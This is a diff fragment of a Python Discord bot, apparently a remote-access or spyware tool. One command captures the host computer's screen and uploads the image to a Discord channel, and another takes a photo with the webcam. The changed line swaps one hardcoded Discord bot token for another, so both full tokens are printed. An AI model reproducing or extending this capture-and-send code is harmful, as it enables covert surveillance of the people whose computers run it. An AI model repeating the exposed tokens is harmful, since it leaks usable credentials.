@@ -86,7 +86,7 @@ async def screenshot(ctx):
     img.save(filename)
     await ctx.send(file=discord.File(filename))
     os.remove(filename)
-bot.run("MTEyNTEzODcyNjc1NDk3NTc2NA.GwcQLB.nb_FaC_EAmhAbH76k_g7EJaPAY_scr_49YIhB0")
+bot.run("MTEyNTEzODcyNjc1NDk3NTc2NA.G2bZBM.nlwMJesf7IhV5ilcNIdtFed1CcV5IXw8kbT3t4")
 @bot.command(brief="Takes a photo using the computer's webcam.", description="Takes a photo using the computer's webcam.")
 async def webcam(ctx, cam=0):
     filename = tempfile._get_default_tempdir() + next(tempfile._get_candidate_names()) + ".png"
